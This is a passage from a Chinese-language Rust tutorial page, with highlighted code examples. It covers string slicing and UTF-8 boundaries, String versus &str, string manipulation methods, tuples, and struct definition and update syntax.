class="line"><span class="keyword">let</span> <span class="variable">slice</span> = &amp;s[<span class="number">4</span>..];</span><br></pre></td></tr></table></figure><p>你也可以截取完整的 <code>String</code> 切片：</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> <span class="variable">s</span> = <span class="type">String</span>::<span class="title function_ invoke__">from</span>(<span class="string">&quot;hello&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> <span class="variable">len</span> = s.<span class="title function_ invoke__">len</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> <span class="variable">slice</span> = &amp;s[<span class="number">0</span>..len];</span><br><span class="line"><span class="keyword">let</span> <span class="variable">slice</span> = &amp;s[..];</span><br></pre></td></tr></table></figure><blockquote><p>在对字符串使用切片语法时需要格外小心，切片的索引必须落在字符之间的边界位置，也就是 UTF-8 字符的边界，例如中文在 UTF-8 中占用三个字节，下面的代码就会崩溃：</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> <span class="variable">s</span> = <span class="string">&quot;中国人&quot;</span>;</span><br><span class="line"><span class="keyword">let</span> <span class="variable">a</span> = &amp;s[<span class="number">0</span>..<span class="number">2</span>];</span><br><span class="line"><span class="built_in">println!</span>(<span class="string">&quot;&#123;&#125;&quot;</span>,a);</span><br></pre></td></tr></table></figure><p>因为我们只取 <code>s</code> 字符串的前两个字节，但是本例中每个汉字占用三个字节，因此没有落在边界处，也就是连 <code>中</code> 字都取不完整，此时程序会直接崩溃退出，如果改成 <code>&amp;s[0..3]</code>，则可以正常通过编译。 因此，当你需要对字符串做切片索引操作时，需要格外小心这一点，关于该如何操作 UTF-8 字符串，参见<a href="https://course.rs/basic/compound-type/string-slice.html#%E6%93%8D%E4%BD%9C-utf-8-%E5%AD%97%E7%AC%A6%E4%B8%B2">这里</a>。</p></blockquote><p>当然，数组也可以切片</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> <span class="variable">a</span> = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> <span class="variable">slice</span> = &amp;a[<span class="number">1</span>..<span class="number">3</span>];</span><br><span class="line"></span><br><span class="line"><span class="built_in">assert_eq!</span>(slice, &amp;[<span class="number">2</span>, <span class="number">3</span>]);</span><br><span class="line"></span><br></pre></td></tr></table></figure><h5 id="String和-str转换"><a href="#String和-str转换" class="headerlink" title="String和&amp;str转换"></a>String和&amp;str转换</h5><p> <code>&amp;str</code> 类型生成 <code>String</code> 类型的操作：</p><ul><li><code>String::from(&quot;hello,world&quot;)</code></li><li><code>&quot;hello,world&quot;.to_string()</code></li></ul><p>那如何将String类型转换成&amp;str</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">s</span> = <span class="type">String</span>::<span class="title function_ invoke__">from</span>(<span class="string">&quot;hello,world!&quot;</span>);</span><br><span class="line">    <span class="title function_ invoke__">say_hello</span>(&amp;s);</span><br><span class="line">    <span class="title function_ invoke__">say_hello</span>(&amp;s[..]);</span><br><span class="line">    <span class="title function_ invoke__">say_hello</span>(s.<span class="title function_ invoke__">as_str</span>());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">fn</span> <span class="title function_">say_hello</span>(s: &amp;<span class="type">str</span>) &#123;</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;&#123;&#125;&quot;</span>,s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="String和-str区别"><a href="#String和-str区别" class="headerlink" title="String和&amp;str区别"></a>String和&amp;str区别</h5><table><thead><tr><th>特性</th><th><code>&amp;str</code></th><th><code>String</code></th></tr></thead><tbody><tr><td><strong>内存分配</strong></td><td>通常不涉及堆分配，指向现有内存或字符串字面量</td><td>在堆上分配内存，存储和管理自己的数据</td></tr><tr><td><strong>可变性</strong></td><td>不可变的字符串切片</td><td>可变字符串，可以修改其内容</td></tr><tr><td><strong>生命周期</strong></td><td><code>&amp;str</code> 的生命周期依赖于引用的源</td><td><code>String</code> 是所有权类型，生命周期与所有权相关</td></tr><tr><td><strong>性能</strong></td><td>更高效，不需要堆分配内存</td><td>相比 <code>&amp;str</code> 有额外的堆分配和内存管理开销</td></tr><tr><td><strong>常见用途</strong></td><td>只读字符串，不需要修改</td><td>需要修改或动态生成字符串</td></tr></tbody></table><h5 id="字符串索引"><a href="#字符串索引" class="headerlink" title="字符串索引"></a>字符串索引</h5><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> <span class="variable">s1</span> = <span class="type">String</span>::<span class="title function_ invoke__">from</span>(<span class="string">&quot;hello&quot;</span>);</span><br><span class="line"><span class="keyword">let</span> <span class="variable">h</span> = s1[<span class="number">0</span>];</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>会报错</p><p>注意：rust<strong>不存在字符串索引</strong></p><h5 id="字符串操作"><a href="#字符串操作" class="headerlink" title="字符串操作"></a>字符串操作</h5><h6 id="追加（push）"><a href="#追加（push）" class="headerlink" title="追加（push）"></a>追加（push）</h6><p>push追加字符</p><p>push_str追加字符串</p><p>这两个方法都是<strong>在原有的字符串上追加，并不会返回新的字符串</strong>。由于字符串追加操作要修改原来的字符串，则该字符串必须是可变的，即<strong>字符串变量必须由 <code>mut</code> 关键字修饰</strong>。</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">s</span> = <span class="type">String</span>::<span class="title function_ invoke__">from</span>(<span class="string">&quot;Hello &quot;</span>);</span><br><span class="line"></span><br><span class="line">    s.<span class="title function_ invoke__">push_str</span>(<span class="string">&quot;rust&quot;</span>);</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;追加字符串 push_str() -&gt; &#123;&#125;&quot;</span>, s);</span><br><span class="line"></span><br><span class="line">    s.<span class="title function_ invoke__">push</span>(<span class="string">&#x27;!&#x27;</span>);</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;追加字符 push() -&gt; &#123;&#125;&quot;</span>, s);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//追加字符串 push_str() -&gt; Hello rust</span></span><br><span class="line"><span class="comment">//追加字符 push() -&gt; Hello rust!</span></span><br></pre></td></tr></table></figure><h6 id="插入（insert）"><a href="#插入（insert）" class="headerlink" title="插入（insert）"></a>插入（insert）</h6><p>insert()插入単个字符</p><p>insert_str()插入字符串</p><p>这俩方法需要传入两个参数，第一个参数是字符（串）插入位置的索引，第二个参数是要插入的字符（串），索引从 0 开始计数，如果越界则会发生错误。由于字符串插入操作要<strong>修改原来的字符串</strong>，则该字符串必须是可变的，即<strong>字符串变量必须由 <code>mut</code> 关键字修饰</strong>。</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">s</span> = <span class="type">String</span>::<span class="title function_ invoke__">from</span>(<span class="string">&quot;Hello rust!&quot;</span>);</span><br><span class="line">    s.<span class="title function_ invoke__">insert</span>(<span class="number">5</span>, <span class="string">&#x27;,&#x27;</span>);</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;插入字符 insert() -&gt; &#123;&#125;&quot;</span>, s);</span><br><span class="line">    s.<span class="title function_ invoke__">insert_str</span>(<span class="number">6</span>, <span class="string">&quot; I like&quot;</span>);</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;插入字符串 insert_str() -&gt; &#123;&#125;&quot;</span>, s);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//插入字符 insert() -&gt; Hello, rust!</span></span><br><span class="line"><span class="comment">//插入字符串 insert_str() -&gt; Hello, I like rust!</span></span><br></pre></td></tr></table></figure><h6 id="替换（replace）"><a href="#替换（replace）" class="headerlink" title="替换（replace）"></a>替换（replace）</h6><p><strong>1.replace</strong></p><p>适用于String和&amp;str类型，replace()方法接收两个参数，第一个是要被替换的字符，第二个是新的字符串，该方法会匹配到所有的字符串。<strong>该方法是返回一个新的字符串，而不是操作原来的字符串</strong>。</p><p>示例代码如下：</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">string_replace</span> = <span class="type">String</span>::<span class="title function_ invoke__">from</span>(<span class="string">&quot;I like rust. Learning rust is my favorite!&quot;</span>);</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">new_string_replace</span> = string_replace.<span class="title function_ invoke__">replace</span>(<span class="string">&quot;rust&quot;</span>, <span class="string">&quot;RUST&quot;</span>);</span><br><span class="line">    dbg!(new_string_replace);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//new_string_replace = &quot;I like RUST. Learning RUST is my favorite!&quot;</span></span><br></pre></td></tr></table></figure><p><strong>2.replacen</strong></p><p>该方法可适用于 <code>String</code> 和 <code>&amp;str</code> 类型。<code>replacen()</code> 方法接收三个参数，前两个参数与 <code>replace()</code> 方法一样，第三个参数则表示替换的个数。<strong>该方法是返回一个新的字符串，而不是操作原来的字符串</strong>。</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">string_replace</span> = <span class="string">&quot;I like rust. Learning rust is my favorite!&quot;</span>;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">new_string_replacen</span> = string_replace.<span class="title function_ invoke__">replacen</span>(<span class="string">&quot;rust&quot;</span>, <span class="string">&quot;RUST&quot;</span>, <span class="number">1</span>);</span><br><span class="line">    dbg!(new_string_replacen);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//new_string_replacen = &quot;I like RUST. Learning rust is my favorite!&quot;</span></span><br></pre></td></tr></table></figure><p>3.replace_range</p><p>该方法仅适用于String类型。replace_range接受两个参数，第一个参数是要替换字符串的范围（Range），第二个参数是新的字符。</p><p><strong>该方法是直接操作原来的字符串，不会返回新的字符串。该方法需要使用 <code>mut</code> 关键字修饰</strong>。</p><p>示例代码如下：</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">string_replace_range</span> = <span class="type">String</span>::<span class="title function_ invoke__">from</span>(<span class="string">&quot;I like rust!&quot;</span>);</span><br><span class="line">    string_replace_range.<span class="title function_ invoke__">replace_range</span>(<span class="number">7</span>..<span class="number">8</span>, <span class="string">&quot;R&quot;</span>);</span><br><span class="line">    dbg!(string_replace_range);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//string_replace_range = &quot;I like Rust!&quot;</span></span><br></pre></td></tr></table></figure><h6 id="删除（delete）"><a href="#删除（delete）" class="headerlink" title="删除（delete）"></a>删除（delete）</h6><p>与删除有关的方法有4个，<code>pop(),remove(),truncate(),clear()</code>.这四个方法仅适用于String类型</p><p><strong>1.pop</strong> –<strong>删除并返回字符串的最后一个字符</strong></p><p><strong>该方法是直接操作原来的字符串</strong>。但是存在返回值，其返回值是一个 <code>Option</code> 类型，如果字符串为空，则返回 <code>None</code>。</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">string_pop</span> = <span class="type">String</span>::<span class="title function_ invoke__">from</span>(<span class="string">&quot;rust pop 中文!&quot;</span>);</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">p1</span> = string_pop.<span class="title function_ invoke__">pop</span>();</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">p2</span> = string_pop.<span class="title function_ invoke__">pop</span>();</span><br><span class="line">    dbg!(p1);</span><br><span class="line">    dbg!(p2);</span><br><span class="line">    dbg!(string_pop);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>2.remove –删除并返回字符串中指定位置的字符</strong></p><p><strong>该方法是直接操作原来的字符串</strong>。但是存在返回值，其返回值是删除位置的字符串，只接收一个参数，表示该字符起始索引位置。</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">string_remove</span> = <span class="type">String</span>::<span class="title function_ invoke__">from</span>(<span class="string">&quot;测试remove方法&quot;</span>);</span><br><span class="line">    <span class="built_in">println!</span>(</span><br><span class="line">        <span class="string">&quot;string_remove 占 &#123;&#125; 个字节&quot;</span>,</span><br><span class="line">        std::mem::<span class="title function_ invoke__">size_of_val</span>(string_remove.<span class="title function_ invoke__">as_str</span>())</span><br><span class="line">    );</span><br><span class="line">    <span class="comment">// 删除第一个汉字</span></span><br><span class="line">    string_remove.<span class="title function_ invoke__">remove</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="comment">// 下面代码会发生错误</span></span><br><span class="line">    <span class="comment">// string_remove.remove(1);</span></span><br><span class="line">    <span class="comment">// 直接删除第二个汉字</span></span><br><span class="line">    <span class="comment">// string_remove.remove(3);</span></span><br><span class="line">    dbg!(string_remove);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>3.truncate –删除字符串中从指定位置开始到结尾的全部字符</strong></p><p><strong>该方法是直接操作原来的字符串</strong>。无返回值。该方法 <code>truncate()</code> 方法是按照字节来处理字符串的</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">string_truncate</span> = <span class="type">String</span>::<span class="title function_ invoke__">from</span>(<span class="string">&quot;测试truncate&quot;</span>);</span><br><span class="line">    string_truncate.<span class="title function_ invoke__">truncate</span>(<span class="number">3</span>);</span><br><span class="line">    dbg!(string_truncate);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>4.clear –清空字符串</strong></p><p><strong>该方法是直接操作原来的字符串</strong>。调用后，删除字符串中的所有字符，相当于 <code>truncate()</code> 方法参数为 0 的时候。</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">string_clear</span> = <span class="type">String</span>::<span class="title function_ invoke__">from</span>(<span class="string">&quot;string clear&quot;</span>);</span><br><span class="line">    string_clear.<span class="title function_ invoke__">clear</span>();</span><br><span class="line">    dbg!(string_clear);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h6 id="连接-Concatenate"><a href="#连接-Concatenate" class="headerlink" title="连接 (Concatenate)"></a>连接 (Concatenate)</h6><p>使用+或者+&#x3D;连接字符串</p><p>在使用 <code>+</code> 时， 必须传递切片引用类型。不能直接传递 <code>String</code> 类型。**<code>+</code> 是返回一个新的字符串，所以变量声明可以不需要 <code>mut</code> 关键字修饰**。</p><h4 id="元组"><a href="#元组" class="headerlink" title="元组"></a>元组</h4><p>定义：</p><p>长度固定、元素顺序固定</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">tup</span>: (<span class="type">i32</span>, <span class="type">f64</span>, <span class="type">u8</span>) = (<span class="number">500</span>, <span class="number">6.4</span>, <span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="用模式匹配解构元组"><a href="#用模式匹配解构元组" class="headerlink" title="用模式匹配解构元组"></a>用模式匹配解构元组</h5><p>将tup里的值分别赋值给x,y,z</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">tup</span> = (<span class="number">500</span>, <span class="number">6.4</span>, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> (x, y, z) = tup;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;The value of y is: &#123;&#125;&quot;</span>, y);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="用-来访问元组"><a href="#用-来访问元组" class="headerlink" title="用.来访问元组"></a>用.来访问元组</h5><p>如果我们想要访问某个特定的元素，我们使用.进行访问</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">x</span>: (<span class="type">i32</span>, <span class="type">f64</span>, <span class="type">u8</span>) = (<span class="number">500</span>, <span class="number">6.4</span>, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> <span class="variable">five_hundred</span> = x.<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> <span class="variable">six_point_four</span> = x.<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> <span class="variable">one</span> = x.<span class="number">2</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>和其他语言一样，元组的索引从0开始。</p><h4 id="结构体"><a href="#结构体" class="headerlink" title="结构体"></a>结构体</h4><h5 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h5><p>一个结构体由几部分组成：</p><ul><li>通过关键字 <code>struct</code> 定义</li><li>一个清晰明确的结构体 <code>名称</code></li><li>几个有名字的结构体 <code>字段</code></li></ul><p>例如：</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">User</span> &#123;</span><br><span class="line">    active: <span class="type">bool</span>,</span><br><span class="line">    username: <span class="type">String</span>,</span><br><span class="line">    email: <span class="type">String</span>,</span><br><span class="line">    sign_in_count: <span class="type">u64</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h5 id="实例化"><a href="#实例化" class="headerlink" title="实例化"></a>实例化</h5><p>我们尝试实例化上面一个结构体</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> <span class="variable">user1</span> = User &#123;</span><br><span class="line">    email: <span class="type">String</span>::<span class="title function_ invoke__">from</span>(<span class="string">&quot;someone@example.com&quot;</span>),</span><br><span class="line">    username: <span class="type">String</span>::<span class="title function_ invoke__">from</span>(<span class="string">&quot;someusername123&quot;</span>),</span><br><span class="line">    active: <span class="literal">true</span>,</span><br><span class="line">    sign_in_count: <span class="number">1</span>,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>有几点值得注意:</p><ol><li>初始化实例时，<strong>每个字段</strong>都需要进行初始化</li><li>初始化时的字段顺序<strong>不需要</strong>和结构体定义时的顺序一致</li></ol><h5 id="访问结构体字段"><a href="#访问结构体字段" class="headerlink" title="访问结构体字段"></a>访问结构体字段</h5><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">user1</span> = User &#123;</span><br><span class="line">    email: <span class="type">String</span>::<span class="title function_ invoke__">from</span>(<span class="string">&quot;someone@example.com&quot;</span>),</span><br><span class="line">    username: <span class="type">String</span>::<span class="title function_ invoke__">from</span>(<span class="string">&quot;someusername123&quot;</span>),</span><br><span class="line">    active: <span class="literal">true</span>,</span><br><span class="line">    sign_in_count: <span class="number">1</span>,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">user1.email = <span class="type">String</span>::<span class="title function_ invoke__">from</span>(<span class="string">&quot;anotheremail@example.com&quot;</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>我们用.来访问和修改结构体实例内部的字段值</p><p>需要注意的是，必须要将结构体实例声明为可变的，才能修改其中的字段</p><h5 id="简化结构体构造"><a href="#简化结构体构造" class="headerlink" title="简化结构体构造"></a>简化结构体构造</h5><p>下面的函数类似一个构建函数，返回了 <code>User</code> 结构体的实例：</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">fn</span> <span class="title function_">build_user</span>(email: <span class="type">String</span>, username: <span class="type">String</span>) <span class="punctuation">-&gt;</span> User &#123;</span><br><span class="line">    User &#123;</span><br><span class="line">        email: email,</span><br><span class="line">        username: username,</span><br><span class="line">        active: <span class="literal">true</span>,</span><br><span class="line">        sign_in_count: <span class="number">1</span>,</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>它接收两个字符串参数： <code>email</code> 和 <code>username</code>，然后使用它们来创建一个 <code>User</code> 结构体，并且返回。可以注意到这两行： <code>email: email</code> 和 <code>username: username</code>，非常的扎眼，因为实在有些啰嗦，如果你从 TypeScript 过来，肯定会鄙视 Rust 一番，不过好在，它也不是无可救药：</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">fn</span> <span class="title function_">build_user</span>(email: <span class="type">String</span>, username: <span class="type">String</span>) <span class="punctuation">-&gt;</span> User &#123;</span><br><span class="line">    User &#123;</span><br><span class="line">        email,</span><br><span class="line">        username,</span><br><span class="line">        active: <span class="literal">true</span>,</span><br><span class="line">        sign_in_count: <span class="number">1</span>,</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如上所示，当函数参数和结构体字段同名时，可以直接使用缩略的方式进行初始化，跟 TypeScript 中一模一样。</p><h5 id="结构体更新语法"><a href="#结构体更新语法" class="headerlink" title="结构体更新语法"></a>结构体更新语法</h5><p>根据已有的结构体实例，创建新的结构体实例，例如根据已有的 <code>user1</code> 实例来构建 <code>user2</code>：</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> <span class="variable">user2</span> = User &#123;</span><br><span class="line">      active: user1.active,</span><br><span class="line">      username: user1.username,</span><br><span class="line">      email: <span class="type">String</span>::<span class="title function_ invoke__">from</span>(<span class="string">&quot;another@example.com&quot;</span>),</span><br><span class="line">      sign_in_count: user1.sign_in_count,</span><br><span class="line">  &#125;;</span><br></pre></td></tr></table></figure><p>我们发现，user1的三个字段居然手动被赋值给了user2，太麻烦了，Rust提供了结构体更新语法：</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> <span class="variable">user2</span> = User &#123;</span><br><span class="line">      email: <span class="type">String</span>::<span class="title function_ invoke__">from</span>(<span class="string">&quot;another@example.com&quot;</span>),</span><br><span class="line">      ..user1</span><br><span class="line">  &#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>只需用一个..，就能将与user1一样的值赋给了user2</p><h5 id="元组结构体（tuple-struct）"><a href="#元组结构体（tuple-struct）" class="headerlink" title="元组结构体（tuple struct）"></a>元组结构体（tuple struct）</h5><p>结构体必须要有名称，但是结构体的字段可以没有名称，这种结构体长得像元组，因此称为元组结构体：    struct Color(i32, i32, i32);<br>    struct Point(i32, i32, i32);</p><pre><code>let black = Color(0, 0, 0);let origin = Point(0, 0, 0);</code></pre><p>元组结构体在你希望有一个整体名称，但是又不关心里面字段的名称时将非常有用。例如上面的 <code>Point</code> 元组结构体，众所周知 3D 点是 <code>(x, y, z)</code> 形式的坐标点，因此我们无需再为内部的字段逐一命名为：<code>x</code>, <code>y</code>, <code>z</code>。</p><h5 id="单元结构体"><a href="#单元结构体" class="headerlink" title="单元结构体"></a>单元结构体</h5><p>单元结构体和单元类型很像，没有任何字段和属性</p><p>如果你定义一个类型，但是不关心该类型的内容，只关心它的行为时，就可以使用 <code>单元结构体</code>：</p><h5 id="使用-derive-Debug-来打印结构体的信息"><a href="#使用-derive-Debug-来打印结构体的信息" class="headerlink" title="使用 #[derive(Debug)] 来打印结构体的信息"></a>使用 <code>#[derive(Debug)]</code> 来打印结构体的信息</h5><p>如果我们想要对一个结构体实例进行打印，需要在代码最前方加上一个<code>#[derive(Debug)]</code> ，然后使用<code>dbg!()</code>或者<code>println!(&quot;&#123;:?&#125;&quot;, s);</code>来输出</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span 